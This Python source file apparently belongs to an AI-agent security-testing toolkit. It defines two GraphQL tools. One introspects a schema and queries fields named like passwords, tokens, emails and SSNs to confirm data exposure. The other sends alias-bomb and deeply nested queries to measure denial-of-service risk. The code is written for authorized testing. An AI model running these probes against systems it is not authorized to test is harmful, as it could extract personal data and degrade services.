"""Deep GraphQL: field-level data leak + query-cost DoS.

graphql_field_leak introspects the schema, finds sensitive-named scalar fields
(password/email/token/ssn) reachable from a query entry point, and actually
queries them — data returned is GraphQL excessive data exposure. graphql_dos
measures cost amplification (alias bomb + deep nested query) vs a trivial query.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


_SENSITIVE = frozenset(
    {
        "password",
        "passwordhash",
        "password_hash",
        "hash",
        "secret",
        "token",
        "accesstoken",
        "access_token",
        "refreshtoken",
        "apikey",
        "api_key",
        "ssn",
        "email",
        "phone",
        "creditcard",
        "credit_card",
        "cvv",
        "dob",
        "salary",
        "isadmin",
        "is_admin",
        "role",
        "privatekey",
        "private_key",
    }
)
_INTROSPECT = (
    "query{__schema{queryType{name fields{name type{name kind ofType{name kind "
    "ofType{name kind ofType{name kind}}}}}}"
    "types{name kind fields{name type{name kind ofType{name kind ofType{name}}}}}}}"
)
_AMPLIFY = 4.0
_FLOOR_MS = 2000


def _post(url: str, query: str, headers: dict[str, str] | None, timeout: int) -> dict[str, Any]:
    req_headers = {"Content-Type": "application/json", **(headers or {})}
    return _replay_impl(
        "POST", url, req_headers, json.dumps({"query": query}), timeout, allow_redirects=False
    )


def _unwrap(type_ref: dict[str, Any] | None) -> tuple[str | None, str | None]:
    """Return (base type name, base kind) after peeling NON_NULL/LIST wrappers."""
    node = type_ref
    for _ in range(6):
        if not isinstance(node, dict):
            return None, None
        if node.get("name") and node.get("kind") in {"OBJECT", "SCALAR", "ENUM", "INTERFACE"}:
            return node.get("name"), node.get("kind")
        node = node.get("ofType")
    return (node or {}).get("name") if isinstance(node, dict) else None, None


def _graphql_field_leak_impl(
    url: str, headers: dict[str, str] | None, timeout: int
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    resp = _post(url, _INTROSPECT, headers, timeout)
    if not resp.get("success"):
        return {"success": False, "error": resp.get("error")}
    try:
        schema = (json.loads(resp.get("body") or "").get("data") or {}).get("__schema")
    except (json.JSONDecodeError, ValueError, AttributeError):
        schema = None
    if not isinstance(schema, dict):
        return {"success": True, "possible_field_leak": False, "note": "introspection disabled"}

    types = {t["name"]: t for t in schema.get("types", []) if isinstance(t, dict) and t.get("name")}

    def _sensitive_scalars(type_name: str) -> list[str]:
        t = types.get(type_name) or {}
        out: list[str] = []
        for f in t.get("fields") or []:
            _base, kind = _unwrap(f.get("type"))
            if kind in {"SCALAR", "ENUM"} and str(f.get("name", "")).lower() in _SENSITIVE:
                out.append(str(f["name"]))
        return out

    entries = ((schema.get("queryType") or {}).get("fields")) or []
    confirmed: list[dict[str, Any]] = []
    schema_exposed: set[str] = set()
    for entry in entries[:15]:
        base, kind = _unwrap(entry.get("type"))
        if kind != "OBJECT" or not base:
            continue
        fields = _sensitive_scalars(base)
        if not fields:
            continue
        schema_exposed.update(fields)
        query = "{ " + str(entry["name"]) + " { " + " ".join(fields) + " __typename } }"
        r = _post(url, query, headers, timeout)
        try:
            data = json.loads(r.get("body") or "")
        except (json.JSONDecodeError, ValueError):
            data = {}
        if (
            isinstance(data, dict)
            and data.get("data", {}).get(entry["name"])
            and not data.get("errors")
        ):
            confirmed.append({"entry": entry["name"], "fields": fields})

    return {
        "success": True,
        "url": url,
        "schema_sensitive_fields": sorted(schema_exposed),
        "confirmed_queries": confirmed,
        "possible_field_leak": bool(confirmed) or bool(schema_exposed),
    }


def _graphql_dos_impl(
    url: str, headers: dict[str, str] | None, alias_count: int, timeout: int
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    n = max(100, min(alias_count, 5000))
    base = _post(url, "{__typename}", headers, timeout)
    base_ms = base.get("elapsed_ms") or 0 if base.get("success") else 0

    alias_bomb = "{" + " ".join(f"a{i}:__typename" for i in range(n)) + "}"
    nested = (
        "query{__schema{types{fields{type{ofType{ofType{ofType{name}}}}}"
        "args{type{ofType{ofType{name}}}}}}}"
    )

    findings: list[dict[str, Any]] = []
    results: list[dict[str, Any]] = []
    for name, query in (("alias_bomb", alias_bomb), ("deep_nested", nested)):
        r = _post(url, query, headers, max(timeout, 20))
        elapsed = r.get("elapsed_ms") or 0
        timed_out = bool(r.get("timed_out"))
        amplified = timed_out or elapsed >= max(_FLOOR_MS, base_ms * _AMPLIFY)
        entry = {
            "test": name,
            "elapsed_ms": round(elapsed),
            "timed_out": timed_out,
            "amplified": amplified,
        }
        results.append(entry)
        if amplified:
            findings.append(entry)
    return {
        "success": True,
        "url": url,
        "baseline_ms": round(base_ms),
        "possible_dos": bool(findings),
        "amplified_tests": [f["test"] for f in findings],
        "results": results,
    }


@function_tool(timeout=120, strict_mode=False)
async def graphql_field_leak(
    ctx: RunContextWrapper, url: str, headers: dict[str, str] | None = None, timeout: int = 20
) -> str:
    """Find GraphQL field-level data exposure (sensitive fields queryable).

    Introspects the schema, finds sensitive-named scalar fields
    (``password``/``email``/``token``/``ssn``/…) reachable from a query entry
    point, and queries them — data returned = excessive data exposure. Run as a
    low-privilege user. Only test authorized targets.

    Returns JSON with ``schema_sensitive_fields``, ``confirmed_queries``, and
    ``possible_field_leak``.

    Args:
        url: GraphQL endpoint URL.
        headers: Optional headers (a low-priv session).
        timeout: Per-request timeout in seconds (default 20).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_graphql_field_leak_impl, url, headers, timeout),
        ensure_ascii=False,
        default=str,
    )


@function_tool(timeout=120, strict_mode=False)
async def graphql_dos(
    ctx: RunContextWrapper,
    url: str,
    headers: dict[str, str] | None = None,
    alias_count: int = 2000,
    timeout: int = 20,
) -> str:
    """Measure GraphQL query-cost DoS risk (alias bomb + deep nested query).

    Sends an alias bomb (N aliased fields in one query) and a deeply nested
    introspection query, and flags either that is far slower than a trivial query
    or times out — no depth/cost limit = an availability risk. One request per
    test; does not flood. Only test authorized targets.

    Returns JSON with ``amplified_tests``, per-test ``elapsed_ms``, and
    ``possible_dos``.

    Args:
        url: GraphQL endpoint URL.
        headers: Optional headers.
        alias_count: Aliases in the bomb (default 2000, max 5000).
        timeout: Per-request timeout in seconds (default 20).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(_graphql_dos_impl, url, headers, alias_count, timeout),
        ensure_ascii=False,
        default=str,
    )
